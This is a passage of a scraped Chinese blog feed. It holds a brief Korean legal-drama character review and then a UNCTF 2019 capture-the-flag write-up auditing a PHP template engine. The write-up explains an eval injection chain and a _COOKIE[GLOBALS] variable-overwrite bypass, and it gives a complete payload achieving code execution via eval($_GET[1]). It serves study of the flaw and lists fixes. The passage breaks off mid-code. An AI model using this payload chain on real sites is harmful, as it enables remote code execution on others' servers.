        <content type="html"><![CDATA[<p><img src="http://raohh.cn/heart.jpg" alt=""></p><h1 id="人物评价"><a href="#人物评价" class="headerlink" title="人物评价"></a>人物评价</h1><h3 id="张彗星"><a href="#张彗星" class="headerlink" title="张彗星"></a>张彗星</h3><p>国选律师。性格豪爽，虽然平时不讲礼仪，不谦虚，但是在重要的事情上总是坚守着正义的底线。前期法庭上辩护的她总是漫不经心，没有任何使命感，在接触到修夏和接连的案子之后慢慢成长，逐渐成为了一位追逐真相的律师。</p><h3 id="朴修夏"><a href="#朴修夏" class="headerlink" title="朴修夏"></a>朴修夏</h3><p>高三学生，具有着读心术，幼年丧父，在经历儿时变故后，拥有了看到对方的眼睛便可以阅读其内心的能力，因为十年前彗星的帮助，曾经立下誓言会守护她。后与女主重逢，在经历一系列事件后共同成长，慢慢明白了很多道理。前期坚持着相信真相的信念，后来也慢慢发现事物的两面性。</p><h3 id="车贯宇"><a href="#车贯宇" class="headerlink" title="车贯宇"></a>车贯宇</h3><p>一腔热血为人民服务的好律师</p><h3 id="第一阶段剧情"><a href="#第一阶段剧情" class="headerlink" title="第一阶段剧情"></a>第一阶段剧情</h3><p><strong><em>真相不是都会在裁判中胜利吗，不是的孩子，顺序搞错了，在裁判中胜利的才是真相。</em></strong></p>]]></content>
      
      
      <categories>
          
          <category> 剧评 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>unctf writeup</title>
      <link href="/2019/11/07/writeup/unctf2019/"/>
      <url>/2019/11/07/writeup/unctf2019/</url>
      
        <content type="html"><![CDATA[<h1 id="unctf2019"><a href="#unctf2019" class="headerlink" title="unctf2019"></a>unctf2019</h1><h2 id="审计一下世界上最好的语言-代码审计"><a href="#审计一下世界上最好的语言-代码审计" class="headerlink" title="审计一下世界上最好的语言(代码审计)"></a>审计一下世界上最好的语言(代码审计)</h2><p>看一下源码，文件命令如下，flag在flag.php里。是海洋cms，这个cms解析模版，会调用eval，之前爆cve</p><pre><code>bbcode_parse.phpcommon.phpindex.phpparse_template.phptemplate.htmlflag.php</code></pre><h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><p>在parse_template.php的parseIf()函数里有eval，这是最终目标，再追踪一下调用。</p><p>parse_again()调用了，这里两个全局变量，$template_html获得html的值，再看看$searchword的调用</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//parse_template.php</span><span class="token variable">$template_html</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"template.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">function</span> <span class="token function">parseIf</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string">'{if:'</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$Rule</span> <span class="token operator">=</span> <span class="token string">"/{if:(.*?)}(.*?){end if}/is"</span><span class="token punctuation">;</span>        <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$Rule</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$iar</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$arlen</span><span class="token operator">=</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$iar</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$elseIfFlag</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$m</span><span class="token operator">&lt;</span><span class="token variable">$arlen</span><span class="token punctuation">;</span><span class="token variable">$m</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$strIf</span><span class="token operator">=</span><span class="token variable">$iar</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$m</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$strIf</span><span class="token operator">=</span><span class="token function">parseStrIf</span><span class="token punctuation">(</span><span class="token variable">$strIf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"if("</span><span class="token punctuation">.</span><span class="token variable">$strIf</span><span class="token punctuation">.</span><span class="token string">") { \$ifFlag=true;} else{ \$ifFlag=false;}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">parse_again</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$template_html</span><span class="token punctuation">,</span><span class="token variable">$searchword</span><span class="token punctuation">;</span>    <span class="token variable">$searchnum</span>     <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'searchnum'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'searchnum'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span>    <span class="token variable">$type</span>         <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span>    <span class="token variable">$typename</span>     <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'typename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'typename'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span>    <span class="token variable">$searchword</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">RemoveXSS</span><span class="token punctuation">(</span><span class="token variable">$searchword</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$searchnum</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">RemoveXSS</span><span class="token punctuation">(</span><span class="token variable">$searchnum</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">RemoveXSS</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$typename</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">RemoveXSS</span><span class="token punctuation">(</span><span class="token variable">$typename</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$template_html</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"{haha:searchword}"</span><span class="token punctuation">,</span><span class="token variable">$searchword</span><span class="token punctuation">,</span><span class="token variable">$template_html</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$template_html</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"{haha:searchnum}"</span><span class="token punctuation">,</span><span class="token variable">$searchnum</span><span class="token punctuation">,</span><span class="token variable">$template_html</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$template_html</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"{haha:type}"</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token punctuation">,</span><span class="token variable">$template_html</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$template_html</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"{haha:typename}"</span><span class="token punctuation">,</span><span class="token variable">$typename</span><span class="token punctuation">,</span><span class="token variable">$template_html</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$template_html</span> <span class="token operator">=</span> <span class="token function">parseIf</span><span class="token punctuation">(</span><span class="token variable">$template_html</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$template_html</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在index.php里调用了parse_again()，全局变量$searchword是从$c中匹配的，$c是从外部传入的。</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//index.php</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">parse_code</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'GLOBALS'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'GLOBALS'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">"[b]hahha[/b]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 清除一些不必要的标签，方便判断 search 是否是独立出来的 html 标签</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;em>.*?&lt;\/em>/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;b>.*?&lt;\/b>/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;video src='.*?'>&lt;\/video>/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;a href='.*?'>/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// search 必须是独立出来的标签哦~</span><span class="token variable">$n</span> <span class="token operator">=</span> <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/&lt;search>(.*?)&lt;\/search>/"</span><span class="token punctuation">,</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token variable">$searchword</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$searchnum</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$n</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$searchword</span> <span class="token operator">=</span> <span class="token variable">$searchword</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$searchword</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">parse_again</span><span class="token punctuation">(</span><span class="token variable">$searchword</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"searchword!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"input your searchword~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="调用逻辑"><a href="#调用逻辑" class="headerlink" title="调用逻辑"></a>调用逻辑</h3><h4 id="传入-c-searchword"><a href="#传入-c-searchword" class="headerlink" title="传入$c , $searchword"></a>传入$c , $searchword</h4><p>c的值为<code>$GLOBALS[&#39;GLOBALS&#39;][&#39;content&#39;]</code>，在common.php里有对传入参数的限制</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">check_var</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$deny</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"_GET"</span><span class="token punctuation">,</span><span class="token string">"_POST"</span><span class="token punctuation">,</span><span class="token string">"GLOBALS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$arr</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$deny</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"no no no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">check_var</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">check_var</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">check_var</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'_GET'</span><span class="token punctuation">,</span><span class="token string">'_POST'</span><span class="token punctuation">,</span><span class="token string">'_COOKIE'</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span>$<span class="token variable">$v</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        $<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>最后的foreach循环会将key值变成变量名，再将数组内容赋值给该变量</p><p>check_var()限制了传进去的数组中key值不能是<code>_GET</code> <code>_POST</code> <code>_GLOBALS</code> 这三个值，但是这里没有过滤 <code>_COOKIE</code></p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//index.php</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">parse_code</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'GLOBALS'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'GLOBALS'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">"[b]hahha[/b]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true">// search 必须是独立出来的标签哦~</span><span class="token variable">$n</span> <span class="token operator">=</span> <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/&lt;search>(.*?)&lt;\/search>/"</span><span class="token punctuation">,</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token variable">$searchword</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>$searchword是从$c匹配&lt;search&gt;(.*?)&lt;/search&gt;提取出来的</p><pre><code>get方法传入$c变量?_COOKIE[GLOBALS][GLOBALS][content]=&lt;search&gt;xxx&lt;/search&gt;</code></pre><h4 id="parseIf-函数"><a href="#parseIf-函数" class="headerlink" title="parseIf()函数"></a>parseIf()函数</h4><pre class=" language-php"><code class="language-php"><span class="token variable">$Rule</span> <span class="token operator">=</span> <span class="token string">"/{if:(.*?)}(.*?){end if}/is"</span><span class="token punctuation">;</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$Rule</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$iar</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$arlen</span><span class="token operator">=</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$iar</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$elseIfFlag</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$m</span><span class="token operator">&lt;</span><span class="token variable">$arlen</span><span class="token punctuation">;</span><span class="token variable">$m</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$strIf</span><span class="token operator">=</span><span class="token variable">$iar</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$m</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$strIf</span><span class="token operator">=</span><span class="token function">parseStrIf</span><span class="token punctuation">(</span><span class="token variable">$strIf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"if("</span><span class="token punctuation">.</span><span class="token variable">$strIf</span><span class="token punctuation">.</span><span class="token string">") { \$ifFlag=true;} else{ \$ifFlag=false;}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>将html的内容匹配<code>&quot;{if:(.*?)}(.*?){end if}/is</code> ，内容将if部分提取出来，进行eval</p><p>类似<code>{if:phpinfo()}1234{end if}</code>就可以执行函数</p><h4 id="parse-again-函数"><a href="#parse-again-函数" class="headerlink" title="parse_again()函数"></a>parse_again()函数</h4><pre class=" language-php"><code class="language-php"><span class="token keyword">global</span> <span class="token variable">$template_html</span><span class="token punctuation">,</span><span class="token variable">$searchword</span><span class="token punctuation">;</span><span class="token variable">$searchnum</span>     <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'searchnum'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'searchnum'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$type</span>         <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$typename</span>     <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'typename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'typename'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$template_html</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"{haha:searchword}"</span><span class="token punctuation">,</span><span class="token variable">$searchword</span><span class="token punctuation">,</span><span class="token variable">$template_html</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$template_html</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"{haha:searchnum}"</span><span class="token punctuation">,</span><span class="token variable">$searchnum</span><span class="token punctuation">,</span><span class="token variable">$template_html</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$template_html</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"{haha:type}"</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token punctuation">,</span><span class="token variable">$template_html</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$template_html</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"{haha:typename}"</span><span class="token punctuation">,</span><span class="token variable">$typename</span><span class="token punctuation">,</span><span class="token variable">$template_html</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>有$searchnum $type $typename 都可控</p><p>将html内容里{haha:xxx}部分内容替换成对应的值</p><p>这样尝试给$searchword传入<code>{if:phpinfo()}1234{end if}</code>，但是有RemoveXSS()函数限制，又截断了20位</p><h4 id="RemoveXSS"><a href="#RemoveXSS" class="headerlink" title="RemoveXSS()"></a>RemoveXSS()</h4><p>限制了<code>if:</code>和其他<code>_GET&#39;,&#39;_POST&#39;,&#39;_COOKIE&#39;,&#39;_REQUEST&#39;,&#39;system&#39;</code>等危险函数</p><p>####最后的payload</p><p>通过其他可控变量$searchword内容为<code>{if{haha:searchnum}}</code>，$searchnum再传入其他字符拼接，绕过限制</p><pre class=" language-php"><code class="language-php"><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">:</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">?</span><span class="token constant">_COOKIE</span><span class="token punctuation">[</span><span class="token constant">GLOBALS</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token constant">GLOBALS</span><span class="token punctuation">]</span><span class="token punctuation">[</span>content<span class="token punctuation">]</span><span class="token operator">=</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>search</span><span class="token punctuation">></span></span></span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">{</span>haha<span class="token punctuation">:</span>searchnum<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>search</span><span class="token punctuation">></span></span></span><span class="token operator">&amp;</span><span class="token constant">_COOKIE</span><span class="token punctuation">[</span><span class="token constant">GLOBALS</span><span class="token punctuation">]</span><span class="token punctuation">[</span>searchnum<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">:</span>eva<span class="token punctuation">{</span>haha<span class="token punctuation">:</span>type<span class="token punctuation">}</span><span class="token operator">&amp;</span><span class="token constant">_COOKIE</span><span class="token punctuation">[</span><span class="token constant">GLOBALS</span><span class="token punctuation">]</span><span class="token punctuation">[</span>type<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">l</span><span class="token punctuation">(</span><span class="token variable">$_G</span><span class="token punctuation">{</span>haha<span class="token punctuation">:</span>typename<span class="token punctuation">}</span><span class="token operator">&amp;</span><span class="token constant">_COOKIE</span><span class="token punctuation">[</span><span class="token constant">GLOBALS</span><span class="token punctuation">]</span><span class="token punctuation">[</span>typename<span class="token punctuation">]</span><span class="token operator">=</span><span class="token constant">ET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h3><p>1 只匹配[b] [url] [em] [video]标签</p><pre class=" language-php"><code class="language-php"><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/\[em\](.*?)\[\/em\]|\[b\](.*?)\[\/b\]|\[video\](.*?)\[\/video\]|\[url\](.*?)\[\/url\]/'</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$content2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token variable">$content2</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>2  清除一些这些不必要的标签</p><h4 id="parse-code-函数"><a href="#parse-code-函数" class="headerlink" title="parse_code()函数"></a>parse_code()函数</h4><p>对[b] [url] [em] [video]标签进行特殊处理，并对内容htmlentities转义标签，限制&lt;search&gt;</p><pre class=" language-php"><code class="language-php"><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">parse_code</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'GLOBALS'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'GLOBALS'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">"[b]hahha[/b]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">parse_code</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$tag_parse_func</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$tag_parse_func</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$func</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$tag_parse_func</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'b_tag_decode'</span><span class="token punctuation">,</span> <span class="token string">'em_tag_decode'</span><span class="token punctuation">,</span><span class="token string">'video_tag_decode'</span><span class="token punctuation">,</span><span class="token string">'url_tag_decode'</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>b_tag_decode函数</p><pre><code>[b]xxx[/b] =&gt; &lt;b&gt;xxx&lt;/b&gt;</code></pre><p>video_tag_decode函数</p><pre><code>[video]http://www.youtube.com?V=123[/video] 变成 &lt;video src=&#39;https://www.youtube.com/embed/123&#39;&gt;&lt;/video&gt;</code></pre><p>url_tag_decode函数 ,href部分没有被htmlentities</p><pre><code>[url]xxx[url] =&gt; &lt;a href=&#39;xxx&#39;&gt;xxx&lt;/a&gt;</code></pre><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">url_tag_decode</span><span class="token punctuation">(</span><span class="token variable">$code</span><span 